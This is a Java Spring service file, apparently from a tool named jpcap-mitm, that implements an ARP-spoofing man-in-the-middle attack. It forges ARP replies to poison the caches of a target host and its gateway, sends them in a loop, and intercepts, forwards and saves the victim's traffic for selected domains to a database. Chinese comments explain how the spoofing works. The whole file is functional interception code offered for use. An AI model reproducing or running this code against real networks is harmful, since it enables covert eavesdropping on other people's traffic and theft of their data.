/*
 * Copyright (c) 2020. Frankie Fan.
 * All rights reserved.
 */

package com.jpcap.mitm.service;

import com.jpcap.mitm.dao.GenericDao;
import com.jpcap.mitm.dao.SequenceDAO;
import com.jpcap.mitm.entity.AttackConfig;
import com.jpcap.mitm.entity.CapturedPacket;
import com.jpcap.mitm.model.ARPPacketModel;
import com.jpcap.mitm.model.ICMPPacketModel;
import com.jpcap.mitm.model.TCPPacketModel;
import com.jpcap.mitm.model.UDPPacketModel;
import com.jpcap.mitm.utils.NetworkUtils;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.JpcapWriter;
import jpcap.NetworkInterface;
import jpcap.packet.*;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Date;
import java.util.List;
import java.util.Map;

/**
 * All protocol will be as bellow:
 * <p>
 * Packet
 * --IP
 * ----UDP
 * ----TCP
 * ------HTTP
 * ------HTTPS
 * ----ICMP
 * --ARP
 *
 * @author Frankie Fan
 */
@SuppressWarnings("Duplicates")
@Service
public class AttackService {
    private static final org.slf4j.Logger logger = LoggerFactory.getLogger(AttackService.class);
    private NetworkInterface[] devices;
    private NetworkInterface device;
    private JpcapCaptor jpcap;
    private JpcapSender sender;
    private JpcapWriter writer;

    private String deviceName;

    private String destIp;
    private String destMac;
    private String srcIp;
    private String srcMac;
    private String gateIp;
    private String gateMac;
    private String filterDomain;

    private InetAddress destIpIA;
    private byte[] destMacBt;
    private InetAddress srcIpIA;
    private byte[] srcMacBt;
    private InetAddress gateIpIA;
    private byte[] gateMacBt;

    private Long batchId;
    private Date startAttackTime;
    private boolean attacking = false;

    private long upStreamNum;
    private long downStreamNum;
    private long upTcpNum;
    private long upUdpNum;
    private long upIcmpNum;
    private long upArpNum;
    private long downTcpNum;
    private long downUdpNum;
    private long downIcmpNum;
    private long downArpNum;

    @Autowired
    private GenericDao genericDao;

    @Autowired
    private SequenceDAO sequenceDAO;

    @Autowired
    private NsLookupService nsLookupService;

    @PostConstruct
    public void initDefaultConfig() throws IOException {
        this.initDevicelist();

        List<AttackConfig> configs = genericDao.findAll(AttackConfig.class);
        if (configs == null) {
            String destIp = "";
            String destMac = "";
            String gateIp = "";
            String gateMac = "";
            String srcIp = null;
            String srcMac = null;

            //get local IP and Mac
            Map<String, Object> localInetMac = NetworkUtils.getLocalInetMac();
            if (localInetMac != null) {
                srcIp = (String) localInetMac.get("ip");
                srcMac = (String) localInetMac.get("mac");
            } else {
                Map<String, Object> publicInetMac = NetworkUtils.getPublicInetMac();
                if (publicInetMac != null) {
                    srcIp = (String) publicInetMac.get("ip");
                    srcMac = (String) publicInetMac.get("mac");
                }
            }

            AttackConfig config = new AttackConfig();
            config.setDeviceName(null);
            config.setSrcIp(srcIp);
            if (srcMac != null)
                srcMac = srcMac.replace('-', ':').toLowerCase();
            config.setSrcMac(srcMac);
            config.setDestIp(destIp);
            if (destMac != null)
                destMac = destMac.replace('-', ':').toLowerCase();
            config.setDestMac(destMac);
            config.setGateIp(gateIp);
            if (gateMac != null)
                gateMac = gateMac.replace('-', ':').toLowerCase();
            config.setGateMac(gateMac);
            genericDao.save(config);
        }
    }

    /**
     * 对于目标主机，目标MAC和目标IP设置为目标主机的，源MAC设置为自己的，源IP设置为网关的。这样的ARP应答包一旦被目标主机接收，其ARP缓存中对应于网关的IP地址的MAC就变成我们的了，此后目标主机再发包，目的地就全部会变成我们。
     * 对于网关，同样的，目标MAC和目标IP设置为网关的，源MAC设置为自己的，源IP设置为目标主机的。
     *
     * @param destIp
     * @param destMac
     * @param srcIp
     * @param srcMac
     * @param gateIp
     * @param gateMac
     * @throws IOException
     */
    public synchronized void updateConfigAndOpenDevice(String deviceName, String destIp, String destMac, String srcIp, String srcMac, String gateIp, String gateMac, String filterDomain) throws IOException {
        this.deviceName = deviceName;
        this.destIp = destIp;
        this.destMac = destMac;
        this.srcIp = srcIp;
        this.srcMac = srcMac;
        this.gateIp = gateIp;
        this.gateMac = gateMac;
        this.filterDomain = filterDomain;
        this.openDevice(deviceName);
        this.initAddresses();
    }

    private void initDevicelist() {
        // 枚举网卡并打开设备
        this.devices = JpcapCaptor.getDeviceList();  //枚举网卡设备
        if (this.devices != null && this.devices.length > 0) {
            this.device = this.devices[0];  //选择网卡设备
            this.deviceName = device.name;
        }
    }

    private void openDevice(String deviceName) throws IOException {
        this.device = getDevicebyName(deviceName);
        this.deviceName = deviceName;
        if (device == null) {
            this.device = devices[0];  //选择网卡设备
            this.deviceName = device.name;
            logger.error("Cannot get device " + deviceName + ", so use the default device: " + device.name);
        }
        this.jpcap = JpcapCaptor.openDevice(device, 2000, false, 10000); //打开与设备的连接
        this.jpcap.close();
        this.jpcap = JpcapCaptor.openDevice(device, 2000, false, 10000); //打开与设备的连接
        //this.jpcap.setFilter("ip and tcp", true); //只监听B的IP数据包
        this.sender = jpcap.getJpcapSenderInstance(); //打开网卡设备
    }

    public NetworkInterface getDevicebyName(String name) {
        if (devices == null || name == null) return null;
        for (NetworkInterface eachDevice : devices) {
            if (name.equals(eachDevice.name)) {
                return eachDevice;
            }
        }
        return null;
    }

    private void initAddresses() throws UnknownHostException {
        destIpIA = InetAddress.getByName(destIp);// 被欺骗的目标IP地址
        destMacBt = NetworkUtils.stomac(destMac);// 被欺骗的目标目标MAC数组
        srcIpIA = InetAddress.getByName(srcIp);// 源IP地址
        srcMacBt = NetworkUtils.stomac(srcMac); // 源MAC数组
        gateIpIA = InetAddress.getByName(gateIp);// 网关IP地址
        gateMacBt = NetworkUtils.stomac(gateMac); // 网关MAC数组
    }

    /**
     * 修改包的以太头，转发数据包
     *
     * @param packet    收到的数据包
     * @param changeMAC 要转发出去的目标
     */

    private void send(Packet packet, byte[] changeMAC) {
        EthernetPacket eth;
        if (packet.datalink instanceof EthernetPacket) {
            eth = (EthernetPacket) packet.datalink;
            for (int i = 0; i < 6; i++) {
                //修改包以太头，改变包的目标
                eth.dst_mac[i] = changeMAC[i];
                //源发送者为A
                eth.src_mac[i] = device.mac_address[i];
            }
            if (sender != null && attacking)
                sender.sendPacket(packet);
        }
    }

    public synchronized void attack() {
        if (attacking)
            return;
        attacking = true;

        this.startAttackTime = new Date();
        this.batchId = sequenceDAO.getNextSequence(SequenceDAO.BATCH_ID);
        this.upStreamNum = 0;
        this.downStreamNum = 0;
        this.upTcpNum = 0;
        this.upUdpNum = 0;
        this.upIcmpNum = 0;
        this.upArpNum = 0;
        this.downTcpNum = 0;
        this.downUdpNum = 0;
        this.downIcmpNum = 0;
        this.downArpNum = 0;
        //update all real ips of domains
        nsLookupService.nsLookup(this.filterDomain);

        // 设置ARP包欺骗目标主机，假装自己是网关
        ARPPacket arp_to_dest = new ARPPacket();
        arp_to_dest.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
        arp_to_dest.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
        arp_to_dest.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
        arp_to_dest.hlen = 6;  //硬件地址长度
        arp_to_dest.plen = 4;  //协议类型长度
        arp_to_dest.sender_hardaddr = srcMacBt;  //发送端MAC地址
        arp_to_dest.sender_protoaddr = gateIpIA.getAddress(); //发送端IP地址
        arp_to_dest.target_hardaddr = destMacBt;  //目标硬件地址
        arp_to_dest.target_protoaddr = destIpIA.getAddress(); //目标IP地址
        // 定义以太网首部
        EthernetPacket eth_to_dest = new EthernetPacket();
        eth_to_dest.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
        eth_to_dest.src_mac = srcMacBt;  //源MAC地址
        eth_to_dest.dst_mac = destMacBt;  //目标MAC地址
        arp_to_dest.datalink = eth_to_dest;  //添加

        // 设置ARP包欺骗网关，假装自己是目标主机
        ARPPacket arp_to_gate = new ARPPacket();
        arp_to_gate.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
        arp_to_gate.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
        arp_to_gate.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
        arp_to_gate.hlen = 6;  //硬件地址长度
        arp_to_gate.plen = 4;  //协议类型长度
        arp_to_gate.sender_hardaddr = srcMacBt;  //发送端MAC地址
        arp_to_gate.sender_protoaddr = destIpIA.getAddress(); //发送端IP地址
        arp_to_gate.target_hardaddr = gateMacBt;  //目标硬件地址
        arp_to_gate.target_protoaddr = gateIpIA.getAddress(); //目标IP地址
        // 定义以太网首部
        EthernetPacket eth_to_gate = new EthernetPacket();
        eth_to_gate.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
        eth_to_gate.src_mac = srcMacBt;  //源MAC地址
        eth_to_gate.dst_mac = gateMacBt;  //目标MAC地址
        arp_to_gate.datalink = eth_to_gate;  //添加

        //创建一个进程控制发包速度
        Thread arpThread = new Thread(() -> {
            while (attacking) {
                try {
                    if (sender != null && attacking)
                        sender.sendPacket(arp_to_dest);
                    if (sender != null && attacking)
                        sender.sendPacket(arp_to_gate);
                    Thread.sleep(500);
                } catch (Throwable e) {
                    logger.error("Unknown error in send thread, ", e);
                }
            }
        });
        arpThread.start();

        Thread revThread = new Thread(() -> {
            //接收数据包并转发
            while (attacking) {
                try {
                    Packet packet = jpcap.getPacket();
                    if (packet != null && packet != Packet.EOF) {
                        //IP: TCP/UDP/ICMP
                        if (packet instanceof IPPacket) {
                            IPPacket ipPacket = (IPPacket) packet;
                            if (this.isIpRelatedWithSpecificDomains(ipPacket.src_ip.getHostAddress()) || this.isIpRelatedWithSpecificDomains(ipPacket.dst_ip.getHostAddress())) {
                                //redirect packets to target or gateway and save them
                                //upstream
                                if (ipPacket.src_ip.getHostAddress().equals(destIp)) {
                                    //If the source mac is local mac, that means this packet is sending by myself to attack, so ignore it
                                    if (packet.datalink instanceof EthernetPacket) {
                                        EthernetPacket eth = (EthernetPacket) packet.datalink;
                                        String sendFromMac = eth.getSourceAddress();
                                        if (!sendFromMac.equalsIgnoreCase(this.srcMac)) {
                                            this.saveCapaturedPacket(ipPacket, true);
                                            //logger.info("IP--- Src: " + ipPacket.src_ip.getHostAddress() + ", Dest: " + ipPacket.dst_ip.getHostAddress());
                                        }
                                    }

                                    send(ipPacket, gateMacBt);
                                }
                                //downstream
                                else if (ipPacket.dst_ip.getHostAddress().equals(destIp)) {
                                    //logger.info("IP--- Src: " + ipPacket.src_ip.getHostAddress() + ", Dest: " + ipPacket.dst_ip.getHostAddress());

                                    //For downstream packets, the important thing is to filter the packets sent by myself for attacking
                                    this.saveCapaturedPacket(ipPacket, false);

                                    send(ipPacket, destMacBt);
                                }
                            }
                        }
                        if (packet instanceof ARPPacket) {
                            ARPPacket arpPacket = (ARPPacket) packet;
                            if (this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.sender_protoaddr)) || this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.target_protoaddr))) {
                                //upstream
                                if (arpPacket.sender_protoaddr.equals(destIpIA.getAddress())) {
                                    //If the source mac is local mac, that means this packet is sending by myself to attack, so ignore it
                                    if (packet.datalink instanceof EthernetPacket) {
                                        EthernetPacket eth = (EthernetPacket) packet.datalink;
                                        String sendFromMac = eth.getSourceAddress();
                                        if (!sendFromMac.equalsIgnoreCase(this.srcMac)) {
                                            //logger.info("ARP--- Src: " + NetworkUtils.bytesToIp(arpPacket.sender_protoaddr) + ", Dest: " + NetworkUtils.bytesToIp(arpPacket.target_protoaddr));
                                            this.saveCapaturedPacket(arpPacket, true);
                                        }
                                    }
                                    send(arpPacket, gateMacBt);
                                }
                                //downstream
                                else if (arpPacket.target_protoaddr.equals(destIpIA.getAddress())) {
                                    //logger.info("ARP--- Src: " + NetworkUtils.bytesToIp(arpPacket.sender_protoaddr) + ", Dest: " + NetworkUtils.bytesToIp(arpPacket.target_protoaddr));
                                    this.saveCapaturedPacket(arpPacket, false);
                                    send(arpPacket, destMacBt);
                                }
                            }
                        }

                    }
                } catch (Throwable e) {
                    logger.error("Unknown error in receive thread, ", e);
                }
            }
        });
        revThread.start();
    }

    private boolean isIpRelatedWithSpecificDomains(String ip) {
        if (ip == null)
            return false;
        List<String> validIps = nsLookupService.getAllIps();
        if (validIps.contains(ip))
            return true;
        return false;
    }

    private void saveCapaturedPacket(Packet packet, boolean upstream) {
        if (upstream)
            this.upStreamNum++;
        else
            this.downStreamNum++;

        CapturedPacket capturedPacket = new CapturedPacket();
        capturedPacket.setUpstream(upstream);
        capturedPacket.setBatchId(this.batchId);
        capturedPacket.setStartAttackTime(this.startAttackTime);
        if (packet instanceof TCPPacket) {
            capturedPacket.setPacket(TCPPacketModel.readFrom((TCPPacket) packet));
            if (upstream)
                this.upTcpNum++;
            else
                this.downTcpNum++;
        } else if (packet instanceof UDPPacket) {
            capturedPacket.setPacket(UDPPacketModel.readFrom((UDPPacket) packet));
            if (upstream)
                this.upUdpNum++;
            else
                this.downUdpNum++;
        } else if (packet instanceof ICMPPacket) {
            capturedPacket.setPacket(ICMPPacketModel.readFrom((ICMPPacket) packet));
            if (upstream)
                this.upIcmpNum++;
            else
                this.downIcmpNum++;
        } else if (packet instanceof ARPPacket) {
            capturedPacket.setPacket(ARPPacketModel.readFrom((ARPPacket) packet));
            if (upstream)
                this.upArpNum++;
            else
                this.downArpNum++;
        }
        genericDao.insert(capturedPacket);
    }

    public Long stopAttack() {
        this.attacking = false;
        return this.batchId;
    }

    public boolean isAttacking() {
        return attacking;
    }

    public String getDestIp() {
        return destIp;
    }

    public void setDestIp(String destIp) {
        this.destIp = destIp;
    }

    public String getDestMac() {
        return destMac;
    }

    public void setDestMac(String destMac) {
        this.destMac = destMac;
    }

    public String getSrcIp() {
        return srcIp;
    }

    public void setSrcIp(String srcIp) {
        this.srcIp = srcIp;
    }

    public String getSrcMac() {
        return srcMac;
    }

    public void setSrcMac(String srcMac) {
        this.srcMac = srcMac;
    }

    public String getGateIp() {
        return gateIp;
    }

    public void setGateIp(String gateIp) {
        this.gateIp = gateIp;
    }

    public String getGateMac() {
        return gateMac;
    }

    public void setGateMac(String gateMac) {
        this.gateMac = gateMac;
    }

    public NetworkInterface[] getDevices() {
        return devices;
    }

    public NetworkInterface getDevice() {
        return device;
    }

    public long getUpStreamNum() {
        return upStreamNum;
    }

    public long getDownStreamNum() {
        return downStreamNum;
    }

    public long getUpTcpNum() {
        return upTcpNum;
    }

    public long getUpUdpNum() {
        return upUdpNum;
    }

    public long getUpIcmpNum() {
        return upIcmpNum;
    }

    public long getUpArpNum() {
        return upArpNum;
    }

    public long getDownTcpNum() {
        return downTcpNum;
    }

    public long getDownUdpNum() {
        return downUdpNum;
    }

    public long getDownIcmpNum() {
        return downIcmpNum;
    }

    public long getDownArpNum() {
        return downArpNum;
    }
}
